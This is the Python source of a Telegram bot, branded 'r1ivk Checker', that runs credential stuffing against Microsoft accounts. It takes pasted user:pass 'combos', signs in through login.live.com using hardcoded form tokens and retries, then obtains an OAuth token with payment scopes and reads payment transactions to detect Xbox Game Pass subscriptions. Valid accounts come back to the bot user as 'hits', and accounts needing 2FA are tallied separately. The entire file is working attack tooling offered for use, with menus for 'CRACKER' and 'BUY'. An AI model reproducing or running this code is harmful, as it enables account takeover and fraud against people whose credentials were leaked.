import telebot
from telebot import types
import requests
import re
import json
from urllib.parse import unquote, quote
import threading
import queue
import time
from datetime import datetime

# Telegram Bot Token
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
bot = telebot.TeleBot(TELEGRAM_TOKEN)

# User Sessions Storage
user_sessions = {}

def solider(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
    try:
        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
        if match:
            value = match.group(1)
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False

def soliderRetries(session, method, url, step_name, retries_counter_list, **kwargs):
    soliderMaxPer = 100
    soliderTimeOut = 15
    for attempt in range(soliderMaxPer + 1):
        try:
            response = session.request(method, url, timeout=soliderTimeOut, **kwargs)
            return response
        except (requests.exceptions.ProxyError, requests.exceptions.SSLError):
            if retries_counter_list:
                retries_counter_list[0] += 1
            raise
        except requests.exceptions.RequestException:
            if attempt < soliderMaxPer:
                if retries_counter_list:
                    retries_counter_list[0] += 1
                time.sleep(1 + attempt)
                continue
            else:
                raise
    return None

def soliderChkAccount(user_pass_line, proxy_dict_for_session, check_mode):
    try:
        user, password = user_pass_line.split(':', 1)
    except ValueError:
        return "BAD_CREDENTIALS", None, 0
      
    variables = {'USER': user, 'PASS': password}
    current_status_internal = "UNKNOWN_INIT"
    account_retry_attempts = [0] 

    session = requests.Session()
    if proxy_dict_for_session:
        session.proxies = proxy_dict_for_session
        
    soliderPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
    soliderBK = "1665024852"
    soliderUAID = "a5b22c26bc704002ac309462e8d061bb"

    try:
        url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(variables['USER'])}&contextid=2CCDB02DC526CA71&bk={soliderBK}&uaid={soliderUAID}&pid=15216"
        
        payload_login_template = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>"
        payload_login = payload_login_template.replace("<USER>", variables['USER']) \
                                    .replace("<PASS>", variables['PASS']) \
                                    .replace("{ppft}", soliderPPFT)

        headers_login = {
            "Host": "login.live.com",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://login.live.com",
            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={soliderUAID}&display=touch&username={quote(variables['USER'])}",
        }
        
        response_login = soliderRetries(session, 'POST', url_login, "Login", account_retry_attempts, headers=headers_login, data=payload_login, allow_redirects=True)
        if not response_login: return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
        response_text = response_login.text
        response_url = response_login.url

        if "Your account or password is incorrect." in response_text or \
           "That Microsoft account doesn\\'t exist" in response_text or \
           ("Sign in to your Microsoft account" in response_text and "oauth20_desktop.srf#access_token=" not in response_url):
            current_status_internal = "FAILURE_CREDENTIALS"
        elif ",AC:null,urlFedConvertRename" in response_text:
            current_status_internal = "BAN_LOCKED"
        elif "account.live.com/recover" in response_text or "account.live.com/identity/confirm" in response_text:
            current_status_internal = "2FACTOR_VERIFICATION"
        else:
            success_cookie_found = any(cookie.name in ["ANON", "WLSSC"] for cookie in session.cookies)
            successful_redirect = "oauth20_desktop.srf#access_token=" in response_url or "https://login.live.com/oauth20_desktop.srf?" in response_url
            if successful_redirect or success_cookie_found:
                current_status_internal = "SUCCESS_LOGIN_STEP"
            else:
                current_status_internal = "FAILURE_LOGIN_UNKNOWN"

    except Exception:
        return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
    
    if current_status_internal != "SUCCESS_LOGIN_STEP":
        if current_status_internal == "FAILURE_CREDENTIALS": return "BAD_CREDENTIALS", None, account_retry_attempts[0]
        if current_status_internal == "2FACTOR_VERIFICATION": return "2FA_REQUIRED", None, account_retry_attempts[0]
        return "LOGIN_FAILED_OTHER", None, account_retry_attempts[0]
    
    try:
        url_oauth_auth = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
        response_oauth_auth = soliderRetries(session, 'GET', url_oauth_auth, "OAuth", account_retry_attempts, allow_redirects=True)
        if not response_oauth_auth or "access_token=" not in response_oauth_auth.url:
            return "TOKEN_ERROR_OAUTH_PARSE", None, account_retry_attempts[0]
            
        solider(response_oauth_auth.url, "access_token=", "&token_type", "Token", variables)
        if not variables.get("Token"):
            return "TOKEN_ERROR_OAUTH_MISSING", None, account_retry_attempts[0]
    except Exception:
        return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]
    
    has_game_pass = False
    game_pass_type = "false"
    game_pass_expired = "false"
    game_pass_expiry_date = "N/A"
    
    try:
        url_payment_transactions = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
        headers_payment = {
            "Authorization": f"MSADELEGATE1.0=\"{variables['Token']}\"",
            "Accept": "application/json"
        }
        response_payment = soliderRetries(session, 'GET', url_payment_transactions, "PaymentTransactions", account_retry_attempts, headers=headers_payment)
        if response_payment and response_payment.status_code == 200:
            transactions_data_text = response_payment.text
            solider(transactions_data_text, 'title":"', '",', "Item 1", variables) 
            solider(transactions_data_text, '"nextRenewalDate":"', 'T', "nextRenewalDate", variables)
            
            item1 = variables.get("Item 1", "").lower()
            if "xbox game pass" in item1 or "game pass" in item1:
                has_game_pass = True
                if "pc" in item1: game_pass_type = "pcgamepass"
                elif "ultimate" in item1: game_pass_type = "ultimate"
                elif "console" in item1: game_pass_type = "console"
                else: game_pass_type = "true"
                
                expiry_date_str = variables.get("nextRenewalDate", "")
                if expiry_date_str:
                    try:
                        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d")
                        game_pass_expiry_date = expiry_date.strftime("%d-%m-%Y")
                        if expiry_date < datetime.now():
                            game_pass_expired = "true"
                    except ValueError:
                        game_pass_expiry_date = expiry_date_str
    except Exception:
        pass

    if check_mode == 1:
        if has_game_pass:
            hit_string = f"{user_pass_line} | GamePass: {game_pass_type} | Expiry: {game_pass_expiry_date}"
            return "GAME_PASS_HIT", hit_string, account_retry_attempts[0]
        else:
            return "NO_GAMEPASS", None, account_retry_attempts[0]
    else:
        if has_game_pass:
            hit_string = f"{user_pass_line} | GamePass: {game_pass_type} | Expiry: {game_pass_expiry_date}"
            return "FULL_CAPTURE_HIT", hit_string, account_retry_attempts[0]
        else:
            return "NO_HITS", None, account_retry_attempts[0]

# --- Telegram Bot Interface (r1ivk Checker UI) ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 START", callback_data="start_scan"),
        types.InlineKeyboardButton("❌ CLOSE", callback_data="close_bot"),
        types.InlineKeyboardButton("🔑 SERVICES", callback_data="services"),
        types.InlineKeyboardButton("🔥 CRACKER", callback_data="cracker"),
        types.InlineKeyboardButton("🎁 REFER", callback_data="refer"),
        types.InlineKeyboardButton("🏆 LEADERBOARD", callback_data="leaderboard"),
        types.InlineKeyboardButton("💎 BUY", callback_data="buy"),
        types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
    )
    welcome_text = (
        "💎 **r1ivk Checker Bot** 💎\n\n"
        "Welcome back! Choose an option from the menu below:"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["start_scan", "services", "cracker", "refer", "leaderboard", "buy", "profile", "close_bot", "main_menu"])
def handle_menu(call):
    bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    
    if call.data == "close_bot":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except Exception:
            pass
        return
        
    if call.data == "start_scan":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("⚡ Game Pass Only", callback_data="mode_1"),
            types.InlineKeyboardButton("🔍 Full Capture", callback_data="mode_2"),
            types.InlineKeyboardButton("🔙 Back", callback_data="main_menu")
        )
        try:
            bot.edit_message_text("📂 **Select Checking Mode:**", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        except Exception:
            pass
    elif call.data == "main_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🚀 START", callback_data="start_scan"),
            types.InlineKeyboardButton("❌ CLOSE", callback_data="close_bot"),
            types.InlineKeyboardButton("🔑 SERVICES", callback_data="services"),
            types.InlineKeyboardButton("🔥 CRACKER", callback_data="cracker"),
            types.InlineKeyboardButton("🎁 REFER", callback_data="refer"),
            types.InlineKeyboardButton("🏆 LEADERBOARD", callback_data="leaderboard"),
            types.InlineKeyboardButton("💎 BUY", callback_data="buy"),
            types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
        )
        try:
            bot.edit_message_text("💎 **r1ivk Checker Bot** 💎\n\nWelcome back! Choose an option from the menu below:", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        except Exception:
            pass
    else:
        bot.answer_callback_query(call.id, "Section under development!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data in ["mode_1", "mode_2"])
def set_mode(call):
    bot.answer_callback_query(call.id)
    mode = 1 if call.data == "mode_1" else 2
    user_sessions[call.from_user.id] = {"mode": mode, "step": "waiting_combos"}
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="start_scan"))
    
    try:
        bot.edit_message_text(
            "📥 **Please send your combos list (user:pass format, one per line):**",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
    except Exception:
        pass

@bot.message_handler(func=lambda message: message.from_user.id in user_sessions and user_sessions[message.from_user.id]["step"] == "waiting_combos")
def handle_combos(message):
    user_id = message.from_user.id
    combos = [line.strip() for line in message.text.split("\n") if ':' in line.strip()]
    
    if not combos:
        bot.send_message(message.chat.id, "❌ No valid combos found. Please send in `user:pass` format:")
        return
        
    mode = user_sessions[user_id]["mode"]
    user_sessions[user_id]["stop"] = False
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔴 Stop Scan", callback_data=f"stop_scan_{user_id}"))
    
    initial_text = generate_progress_text(0, len(combos), 0, 0, 0, 0, 0, "00:00:00", "00:00", 0, "Running...")
    prog_msg = bot.send_message(message.chat.id, initial_text, parse_mode="Markdown", reply_markup=markup)
    
    threading.Thread(target=run_live_checker, args=(message.chat.id, prog_msg.message_id, combos, mode, user_id)).start()

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_scan_"))
def stop_scan(call):
    try:
        uid = int(call.data.split("_")[2])
        if uid in user_sessions:
            user_sessions[uid]["stop"] = True
    except Exception:
        pass
    bot.answer_callback_query(call.id, "Scan stopped by user!")

def generate_progress_text(checked, total, gamepass, full_captures, two_fa, bad, cpm, elapsed_str, eta_str, progress_percent, status_title):
    filled_blocks = int(progress_percent // 10)
    bar = "█" * filled_blocks + "░" * (10 - filled_blocks)
    
    text = (
        f"🤖 **r1ivk | AIOH Checker**\n"
        f"bot\n\n"
        f"Progress: {progress_percent:.1f}%\n"
        f"`[{bar}]`\n\n"
        f"⚡ CPM: {cpm}\n"
        f"⏳ Elapsed: {elapsed_str}\n"
        f"⏳ ETA: {eta_str}\n\n"
        f"🎮 **Gaming Hits:**\n"
        f"▪️ Game Pass Hits: {gamepass}\n"
        f"▪️ Full Captures: {full_captures}\n"
        f"▪️ 2FA: {two_fa}\n"
        f"❌ Bad: {bad}\n"
        f"📊 Checked: {checked} / {total}\n\n"
        f"Status: **{status_title}**"
    )
    return text

def run_live_checker(chat_id, message_id, combos, check_mode, user_id):
    total = len(combos)
    checked = 0
    gamepass = 0
    full_captures = 0
    two_fa = 0
    bad = 0
    
    start_time = time.time()
    last_update_time = start_time
    
    for index, combo in enumerate(combos):
        if user_sessions.get(user_id, {}).get("stop", False):
            break
            
        status, hit_data, _ = soliderChkAccount(combo, None, check_mode)
        checked += 1
        
        if status == "GAME_PASS_HIT":
            gamepass += 1
            try:
                bot.send_message(chat_id, f"🎯 **GamePass Hit!**\n`{hit_data}`", parse_mode="Markdown")
            except Exception:
                pass
        elif status == "FULL_CAPTURE_HIT":
            full_captures += 1
            try:
                bot.send_message(chat_id, f"🎯 **Full Capture Hit!**\n`{hit_data}`", parse_mode="Markdown")
            except Exception:
                pass
        elif status == "BAD_CREDENTIALS":
            bad += 1
        elif status == "2FA_REQUIRED":
            two_fa += 1
            
        current_time = time.time()
        if current_time - last_update_time >= 1.5 or checked == total:
            last_update_time = current_time
            elapsed = int(current_time - start_time)
            elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
            
            cpm = int((checked / (elapsed / 60))) if elapsed > 0 else 0
            remaining_items = total - checked
            eta_secs = int((remaining_items / (cpm / 60))) if cpm > 0 else 0
            eta_str = time.strftime("%M:%S", time.gmtime(eta_secs))
            progress_percent = (checked / total) * 100
            
            progress_text = generate_progress_text(
                checked, total, gamepass, full_captures, two_fa, bad, 
                cpm, elapsed_str, eta_str, progress_percent, "Scanning..."
            )
            
            try:
                bot.edit_message_text(progress_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
            except Exception:
                pass

    final_elapsed = int(time.time() - start_time)
    final_elapsed_str = time.strftime("%H:%M:%S", time.gmtime(final_elapsed))
    final_cpm = int((total / (final_elapsed / 60))) if final_elapsed > 0 else 0
    
    completion_text = (
        f"✅ **XBOX FULL CAPTURE COMPLETED!**\n\n"
        f"🌐 Total: {total} / {final_cpm} CPM\n"
        f"💎 Full Captures: {full_captures}\n"
        f"🎮 Game Pass: {gamepass}\n"
        f"🔐 2FA: {two_fa}\n"
        f"❌ Bad: {bad}\n"
        f"⏱️ Time Taken: {final_elapsed_str}"
    )
    try:
        bot.edit_message_text(completion_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
    except Exception:
        pass

if __name__ == "__main__":
    print("r1ivk Checker Bot is running (English UI)...")
    bot.infinity_polling()
